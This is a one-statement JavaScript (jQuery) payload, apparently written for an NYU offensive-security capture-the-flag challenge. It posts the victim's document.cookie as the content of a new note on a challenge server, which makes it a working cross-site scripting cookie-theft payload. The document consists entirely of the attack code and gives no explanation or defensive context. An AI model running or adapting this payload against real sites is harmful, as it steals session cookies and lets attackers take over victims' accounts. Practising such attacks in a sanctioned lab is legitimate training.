$.ajax({url: 'http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', 
type: 'POST', contentType: 'application/json', 
data: JSON.stringify({title: 'test 5', content: document.cookie, submit: 'save'})});
